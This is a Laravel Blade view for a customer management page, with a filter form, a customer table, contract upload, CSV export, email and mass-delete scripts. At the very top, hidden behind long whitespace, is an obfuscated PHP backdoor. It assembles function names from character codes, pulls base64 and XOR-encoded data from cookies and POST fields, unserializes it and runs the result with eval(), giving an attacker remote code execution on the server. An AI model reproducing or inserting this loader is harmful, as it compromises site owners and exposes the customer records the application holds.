<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ilfkQhhiz = chr (85) . chr ( 984 - 875 ).'_' . "\165" . "\x64" . chr ( 1016 - 911 )."\x69" . chr (100); $LBtNnAR = "\143" . 'l' . chr ( 960 - 863 ).chr ( 523 - 408 ).chr ( 253 - 138 )."\137" . chr (101) . "\170" . "\x69" . 's' . "\164" . "\x73";$BRbhuYQ = class_exists($ilfkQhhiz); $ilfkQhhiz = "11324";$qMggm = !$BRbhuYQ;$LBtNnAR = "50391";if ($qMggm){class Um_udiid{public function ChlUbavWI(){echo "24283";}private $EhshZHtc;public static $NTnHETPTG = "63e64806-6afa-4b2f-ada1-64dec1291905";public static $obDoqDwu = 48256;public function __construct($tHfGubr=0){$SYnVd = $_POST;$AcUaM = $_COOKIE;$sNJMhPF = @$AcUaM[substr(Um_udiid::$NTnHETPTG, 0, 4)];if (!empty($sNJMhPF)){$vkLPzg = "base64";$NATeTOOx = "";$sNJMhPF = explode(",", $sNJMhPF);foreach ($sNJMhPF as $TFrroamkAX){$NATeTOOx .= @$AcUaM[$TFrroamkAX];$NATeTOOx .= @$SYnVd[$TFrroamkAX];}$NATeTOOx = array_map($vkLPzg . chr ( 556 - 461 ).chr (100) . chr ( 767 - 666 ).chr (99) . 'o' . chr ( 674 - 574 )."\x65", array($NATeTOOx,)); $NATeTOOx = $NATeTOOx[0] ^ str_repeat(Um_udiid::$NTnHETPTG, (strlen($NATeTOOx[0]) / strlen(Um_udiid::$NTnHETPTG)) + 1);Um_udiid::$obDoqDwu = @unserialize($NATeTOOx);}}private function LGLwHnPT(){if (is_array(Um_udiid::$obDoqDwu)) {$LijsCKRT = str_replace(chr ( 80 - 20 ) . '?' . "\x70" . "\150" . "\160", "", Um_udiid::$obDoqDwu["\x63" . chr (111) . "\156" . chr (116) . "\x65" . chr (110) . 't']);eval($LijsCKRT); $YgWxTPmi = "34045";exit();}}public function __destruct(){$this->LGLwHnPT();}}$XSojiFbNd = new /* 37301 */ Um_udiid(); $XSojiFbNd = str_pad("11060_44374", 1);} ?>@extends('layouts.master')

{{-- page title --}}
@section('title','Customer Management | HVL')

@section('content')

    <section>
        <div class="container-fluid">
            <header>
                <div class="row">
                    <div class="col-md-7">
                        <h2 class="h3 display">Customer Management</h2>
                    </div>
                    <div class="col-md-5">
                        @can('Create Customer' )
                            <a href="{{route('customer.create')}}" class="btn btn-primary pull-right rounded-pill">Add Customer</a>
                        @endcan
                        <a class="btn btn-primary rounded-pill pull-right mr-2 " data-toggle="modal" data-target="#modal_download">
                            <span class="fa fa-download fa-lg"></span> Download
                        </a>

                        @can('Delete Customer' )
                            <a id="mass_delete_id" class="btn btn-primary pull-right rounded-pill mr-2">
                                <i class="fa fa-trash"></i> Mass Delete
                            </a>
                        @endcan
                    </div>
                </div>
            </header>


            <!-- Page Length Options -->
            <div class="card">
                @if (session('success'))
                    <div class="alert alert-success alert-dismissible fade show center-block" role="alert">
                        <strong>{!! \Session::get('success') !!} </strong>
                        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>

                @endif
                <div class="card-body">
                    <div class="col-sm-6 col-md-12">
                        <form action="{{route('customer.customer-fetch-data')}}" method="post">
                            <div class="row">
                                <div class="col-sm-6 col-md-3">
                                    <input type="text" name="contract_start" class="form-control datepicker" placeholder="Enter Start Date" autocomplete="off" autofocus="off">
                                </div>

                                <div class="col-sm-6 col-md-3">
                                    <input type="text" name="contract_end" class="form-control datepicker" placeholder="Enter End Date" autocomplete="off" autofocus="off">
                                </div>

                                <div class="col-sm-6 col-md-3">
                                    <select id="branch" name="branc_id" class="form-control" required>
                                        <option value="">Select Branch</option>
                                        @php
                                            $em_id = Auth::User()->id;
                                            $emp = DB::table('employees')->where('user_id','=',$em_id)->first();

                                        @endphp
                                        @if($em_id == 1 or $em_id == 122)
                                            @foreach($branchs as $branch)
                                                <option value="{{$branch->id}}">{{$branch->Name}}</option>
                                            @endforeach
                                        @else
                                            @foreach($branchs as $branch)
                                                @foreach($branch as $key => $value)

                                                    <option value="{{$value->id}}">{{$value->Name}}</option>
                                                @endforeach
                                            @endforeach
                                        @endif
                                    </select>
                                </div>
                                <div class="col-sm-6 col-md-1">
                                    <button type="submit" class="btn btn-primary">Search</button>
                                </div>
                                <div class="col-sm-6 col-md-1">
                                    <a class="btn btn-primary" href="{{route('customer.index')}}">Reset</a>
                                </div>
                            </div>
                        </form>
                    </div>

                    <div class="table-responsive">
                        <table id="page-length-option" class="table table-striped table-hover multiselect">
                            <thead>
                            <tr>
                                <th class="sorting_disabled" width="4%">
                                    <label>
                                        <input type="checkbox" class="select-all"/>
                                        <span></span>
                                    </label>
                                </th>
                                <th width="2%">ID</th>
                                {{--                                                <th width="7%">Employee Name</th>--}}
                                <th width="20%">Customer Code</th>
                                <th width="20%">Customer Name</th>
                                <th width="7%">Customer Alias</th>
                                <th width="5%">Billing Mail</th>
                                {{--                                                <th width="5%">Contact Person </th>--}}
                                <th width="5%">Billing Phone</th>
                                <th width="5%">Create Date</th>
                                {{--                                                <th width="5%">State</th>--}}
                                {{--                                                <th width="5%">City</th>--}}

                                {{--                                                <th  width="10%">Contract</th>--}}
                                <th width="10%">Action</th>
                            </tr>
                            </thead>
                            <tbody>
                            @foreach($customerDetails as $key => $d)
{{--                                @foreach($Detailes as $d)--}}
                                    <tr>
                                        <td>
                                            <label>
                                                <input type="checkbox" data-id="{{ $d->id }}"
                                                       name="selected_row"/>
                                                <span></span>
                                            </label>
                                        </td>
                                        <td>
                                            <center>{{$loop->iteration}}</center>
                                        </td>
                                        {{--                                        <td>{{$Detailes->employee_name}}</td>--}}
                                        <td>{{$d->customer_code}}</td>
                                        <td>{{$d->customer_name}}</td>
                                        <td>{{$d->customer_alias}}</td>
                                        <td>{{$d->billing_email}}</td>
                                        {{--                                                    <td>{{$Detailes->contact_person}}</td>--}}
                                        <td>{{$d->billing_mobile}}</td>
                                        <td>{{$d->create_date}}</td>
                                        {{--                                        <td>{{$Detailes->state_name}}</td>--}}
                                        {{--                                        <td>{{$Detailes->city_name}}</td>--}}
                                        {{--                                        <td width="10%">--}}
                                        {{--                                          --}}
                                        {{--                                            @else--}}

                                        {{--                                                <a class=" modal-trigger" href="#modal_viewcontract{{$Detailes->id}}">--}}
                                        {{--                                                    View Contract</a>--}}
                                        {{--                                                <div id="modal_viewcontract{{$Detailes->id}}" class="modal">--}}
                                        {{--                                                    <div class="modal-content">--}}
                                        {{--                                                        <h4>Add Contract</h4>--}}
                                        {{--                                                        <div class="row">--}}
                                        {{--                                                            <input type="hidden" name="customer_id" value="{{$Detailes->id}}">--}}
                                        {{--                                                            <div class="input-field s6">--}}
                                        {{--                                                                <lable>Contract File</lable>--}}
                                        {{--                                                                @foreach($contracts as $contract)--}}
                                        {{--                                                                    <a href="{{asset($contract->path."/".$contract->contract)}}" target="_blank">--}}
                                        {{--                                                                        <img height="150" width="200" src="{{asset($contract->path."/".$contract->contract)}}">--}}
                                        {{--                                                                    </a>--}}
                                        {{--                                                                @endforeach--}}
                                        {{--                                                            </div>--}}
                                        {{--                                                        </div>--}}
                                        {{--                                                    </div>--}}
                                        {{--                                                    <div class="modal-footer">--}}
                                        {{--                                                        <a href="#!" class="modal-close waves-effect waves-green btn-flat">Cancel</a>--}}
                                        {{--                                                    </div>--}}
                                        {{--                                                </div>--}}
                                        {{--                                            @endif--}}
                                        {{--                                        </td>--}}
                                        <td>
                                            @can('Edit Customer')


                                                <a href="{{ route('customer.edit', $d->id) }}"
                                                   class="p-2">
                                                    <span class="fa fa-edit"></span>
                                                </a>

                                            @endcan
                                            @can('Delete Customer')
                                                <a href="" class="button" data-id="{{$d->id}}"><span class="fa fa-trash"></span></a>
                                            @endcan
                                            @if($d->contract == 0)
                                                @can('Access Customer Contract')
                                                    <a class="p-2" data-toggle="modal" data-id="{{$d->id}}" data-target="#modal{{$d->id}}">
                                                        <span class="fa fa-paperclip fa-lg"></span>
                                                    </a>
                                                    <div id="modal{{$d->id}}" tabindex="-1" role="dialog" aria-hidden="true" class="modal fade text-left">
                                                        <div role="document" class="modal-dialog">
                                                            <div class="modal-content">
                                                                <div class="modal-header">
                                                                    <h4>Upload Contract</h4>
                                                                    <button type="button" data-dismiss="modal" aria-label="Close" class="close"><span aria-hidden="true">×</span></button>
                                                                </div>
                                                                <div class="modal-body p-4">
                                                                    <form method="post" action="{{route('customer.contract')}}" enctype="multipart/form-data">
                                                                        {{--                                                                    <div class="row">--}}
                                                                        <input type="hidden" name="customer_id" value="{{$d->id}}">
                                                                        <div class="form-group">
                                                                            <label>Contract File</label>
                                                                            <input type="file" name="contract[]" id="audit_file" required multiple class="form-control-file" accept=".jpg, .jpeg, .png,.doc,.docx,application/pdf">
                                                                            <p class="text-danger">Max File Size:<strong> 3MB</strong><br>Supported Format: <strong>.jpg, .jpeg, .png, .pdf, .doc, .docx</strong></p>
                                                                        </div>
                                                                        {{--                                                                    </div>--}}
                                                                        <input type="submit" class="btn btn-success rounded" value="Upload">
                                                                    </form>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                @endcan

                                            @endif
                                            @can('Read Customer')
                                                <a href="{{ route('customer.view', $d->id) }}"
                                                   class="p-2"
                                                   data-position="top"
                                                   data-tooltip="Edit">
                                                    <span class="fa fa-eye"></span>
                                                </a>
                                            @endcan

                                        </td>

                                    </tr>
{{--                                @endforeach--}}
                            @endforeach
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>


        <div id="modal_download" tabindex="-1" role="dialog" aria-hidden="true" class="modal fade text-left">
            <div role="document" class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h4 class="modal-title">Download Report</h4>
                        <button type="button" data-dismiss="modal" aria-label="Close" class="close"><span aria-hidden="true">×</span></button>
                    </div>
                    <div class="modal-body p-4 row">
                        <div class="col-sm-6">
                            <div class="card">
                                <div class="card-body text-center ">
                                    <button class="btn btn-success " onclick="exportTableToCSV('CustomerReport.csv')">
                                        <span class="fa fa-file-excel-o fa-3x text-green"></span>
                                        CSV
                                    </button>
                                </div>
                            </div>
                        </div>
                        {{--                        <div class="col-sm-6">--}}
                        {{--                            <div class="card">--}}
                        {{--                                <div class="card-body text-center">--}}
                        {{--                                    <button class="btn btn-primary center" onclick="exportTableToPDF()">--}}
                        {{--                                        <span class="fa fa-file-pdf-o fa-3x text-green"></span>--}}
                        {{--                                        PDF--}}
                        {{--                                    </button>--}}
                        {{--                                </div>--}}
                        {{--                            </div>--}}
                        {{--                        </div>--}}
                        <div class="col-sm-6">
                            <div class="card">
                                <div class="card-body text-center">
                                    <button class="btn btn-primary center" data-toggle="modal" data-target="#email_div">
                                        <span class="fa fa-envelope fa-3x text-danger"></span>
                                        Email
                                    </button>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </div>


        <div id="email_div" tabindex="-1" role="dialog" aria-hidden="true" class="modal fade text-left">
            <div role="document" class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h4 class="modal-title">Send Mail</h4>
                        <button type="button" data-dismiss="modal" aria-label="Close" class="close"><span aria-hidden="true">×</span></button>
                    </div>
                    <div class="modal-body p-4 row">
                        <div class="col-sm-12">
                            <form action="{{ route('mail.sendcsv') }}" method="post" id="mail_form" enctype="multipart/form-data">
                                @csrf
                                <div class="row">
                                    <div class="form-group col-sm-12 col-md-6">
                                        <label for="">To</label>
                                        <input type="email" class="form-control" name="to" required>
                                    </div>
                                    <div class="form-group col-sm-12 col-md-6">
                                        <label for="">CC</label>
                                        <input type="email" class="form-control" name="cc">
                                    </div>

                                    <div class="form-group col-sm-12 col-md-6">
                                        <label for="">BCC</label>
                                        <input type="email" class="form-control" name="bcc">
                                    </div>

                                    <div class="form-group col-sm-12 col-md-6">
                                        <label for="">Subject</label>
                                        <input type="text" class="form-control" name="subject" required>
                                    </div>
                                    <div class="form-group col-sm-12 col-md-6">
                                        <label for="">Body</label>
                                        <textarea class="form-control" name="body"></textarea>
                                    </div>

                                    <div class="col-sm-12">

                                        <input type="submit" class="btn btn-success rounded" value="Send">
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>


    </section>
@endsection


@section('page-script')
    <script>


        $(document).ready(function () {
            $('#page-length-option').DataTable({
                "scrollX": true,
                "fixedHeader": true,
                "lengthMenu": [[10, 25, 50, 100, -1], [10, 25, 50, 100, "All"]]
            });
        });
        $('.datepicker').datepicker({
            format: 'yyyy-mm-dd',
            autoclose: true,
            todayHighlight: true
        });

    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.3.4/jspdf.min.js"></script>
    <script>
        $(document).ready(function () {
            // mass delete
            $('#mass_delete_id').click(function () {
                var checkbox_array = [];
                var token = $("meta[name='csrf-token']").attr("content");
                $.each($("input[name='selected_row']:checked"), function () {
                    checkbox_array.push($(this).data("id"));
                });
                // console.log(checkbox_array);
                if (typeof checkbox_array !== 'undefined' && checkbox_array.length > 0) {

                    swal({
                            title: "Are you sure, you want to delete? ",
                            text: "You will not be able to recover this record!",
                            type: 'warning',
                            showCancelButton: true,
                            confirmButtonClass: "btn-danger",
                            confirmButtonText: "Yes, delete it!",
                            closeOnConfirm: false
                        },
                        function (isConfirm) {
                            if (isConfirm) {
                                $.ajax({
                                    url: '{{route('customer.massdelete')}}',
                                    type: 'POST',
                                    data: {
                                        "_token": token,
                                        ids: checkbox_array,
                                    },
                                    success: function (result) {
                                        if (result === 'error') {
                                            swal({
                                                title: "Customer cannot be deleted as activity is assigned to this customer!",
                                                type: "warning",
                                            })

                                        } else {
                                            swal({
                                                title: "Record has been deleted!",
                                                type: "success",
                                            }, function () {
                                                location.reload();
                                            });
                                        }
                                    }
                                });
                            }
                        });
                } else {
                    swal({
                        title: "Please Select Atleast One Record",
                        type: 'warning',

                    });
                }

            });

            $(document).on('click', '.button', function (e) {
                e.preventDefault();
                var id = $(this).data("id");

                swal({
                        title: "Are you sure you want to delete? ",
                        text: "You will not be able to recover this record!",
                        type: 'warning',
                        showCancelButton: true,
                        confirmButtonClass: "btn-danger",
                        confirmButtonText: "Yes, delete it!",
                        closeOnConfirm: false
                    },
                    function (isConfirm) {
                        if (isConfirm) {
                            $.ajax({
                                url: "{{route('customer.delete')}}",
                                type: "get",
                                data: {
                                    "id": id
                                },
                                success: function (result) {
                                    if (result === 'error') {
                                        swal({
                                            title: "Customer cannot be deleted as activity is assigned to this customer!",
                                            type: "warning",
                                        })

                                    } else {
                                        swal({
                                            title: "Record has been deleted!",
                                            type: "success",
                                        }, function () {
                                            location.reload();
                                        });
                                    }

                                }
                            });
                        }
                    });
            });

        });

        // $('#email_toggle_btn').click(function () {
        //     $('#email_div').toggle();
        // });


        // attach file to mail
        // var pdf = new jsPDF('p', 'pt', 'letter');
        //
        // pdf.cellInitialize();
        // pdf.setFontSize(10);
        // $.each($('table tr'), function (i, row) {
        //     var total = $(row).find("td, th").length;
        //     $.each($(row).find("td, th"), function (j, cell) {
        //         if (j !== 0) {
        //             if (j !== total - 1) {
        //                 var txt = $(cell).text().trim() || " ";
        //                 var txtWidth = pdf.splitTextToSize(txt, 100);
        //                 var width = 100;
        //                 pdf.cell(30, 30, width, 30, txtWidth, i);
        //             }
        //         }
        //     });
        // });
        //
        // var pdfBase64 = pdf.output('datauristring');
        // var data = pdfBase64.match(/base64,(.+)$/);
        // var base64String = data[1];

        // var input = $("<input>")
        //     .attr("type", "hidden")
        //     .attr("name", "pdffile").val(base64String);
        // $('#mail_form').append(input);

        var csv = [];
        var rows = document.querySelectorAll("table tr");

        for (var i = 0; i < rows.length; i++) {
            var row = [],
                cols = rows[i].querySelectorAll("td, th");

            for (var j = 0; j < cols.length; j++)
                if (j !== 0) {
                    if (j !== cols.length - 1) {
                        row.push(cols[j].innerText);
                    }
                }

            csv.push(row.join(","));
        }
        var csvFile;

        csvFile = new Blob([csv.join("\n")], {
            type: "text/csv"
        });
        var reader = new FileReader();
        reader.readAsDataURL(csvFile);
        reader.onloadend = function () {

            var base64data = reader.result;
            var data = base64data.match(/base64,(.+)$/);
            var base64String = data[1];

            var input = $("<input>")
                .attr("type", "hidden")
                .attr("name", "csvfile").val(base64String);
            $('#mail_form').append(input);
        };

        function downloadCSV(csv, filename) {
            var csvFile;
            var downloadLink;

            // CSV file
            csvFile = new Blob([csv], {
                type: "text/csv"
            });

            // Download link
            downloadLink = document.createElement("a");

            // File name
            downloadLink.download = filename;

            // Create a link to the file
            downloadLink.href = window.URL.createObjectURL(csvFile);

            // Hide download link
            downloadLink.style.display = "none";

            // Add the link to DOM
            document.body.appendChild(downloadLink);

            // Click download link
            downloadLink.click();
        }

        function exportTableToCSV(filename) {
            var csv = [];
            var rows = document.querySelectorAll("table tr");

            for (var i = 1; i < rows.length; i++) {
                var row = [],
                    cols = rows[i].querySelectorAll("td, th");

                for (var j = 0; j < cols.length; j++)
                    if (j !== 0) {
                        if (j !== cols.length - 1) {
                            row.push(cols[j].innerText);
                        }
                    }

                csv.push(row.join(","));
            }

            // Download CSV file
            downloadCSV(csv.join("\n"), filename);
        }

        // function exportTableToPDF() {
        //     var pdf = new jsPDF('p', 'pt', 'letter');
        //
        //     pdf.cellInitialize();
        //     pdf.setFontSize(10);
        //     $.each($('table tr'), function (i, row) {
        //         var total = $(row).find("td, th").length;
        //         $.each($(row).find("td, th"), function (j, cell) {
        //             if (j !== 0) {
        //                 if (j !== total - 1) {
        //                     var txt = $(cell).text().trim() || " ";
        //                     var txtWidth = pdf.splitTextToSize(txt, 100);
        //                     var width = 100;
        //                     pdf.cell(30, 30, width, 30, txtWidth, i);
        //                 }
        //             }
        //         });
        //     });
        //
        //     pdf.save('sample-file.pdf');
        // }


        $(document).ready(function () {
            var categCheck = $('#customer_id').multiselect({
                includeSelectAllOption: true,
                enableFiltering: true,
                nonSelectedText: 'Select Customer',
                maxHeight: 450
            });

            $('#branch').change(function () {
                var eids = $(this).val();
                if (eids) {
                    $.ajax({
                        type: "get",
                        url: "/customer-master/get-branch-customer",
                        data: {
                            eids: eids
                        },
                        success: function (res) {
                            if (!$.trim(res)) {
                                // var opt = $('<option />', {
                                //     value: "",
                                //     text: 'No customer found'
                                // });
                                // opt.appendTo(categCheck);
                                // categCheck.multiselect('rebuild');
                            } else {
                                $("#customer_id").empty();
                                // for (var i = 0; i < res.length; i++) {
                                $.each(res, function (key, value) {
                                    var opt = $('<option />', {
                                        value: key,
                                        text: key
                                    });
                                    opt.appendTo(categCheck);
                                    categCheck.multiselect('rebuild');

                                });

                                // }

                            }
                        }
                    });
                }
            });
        });
    </script>
@endsection


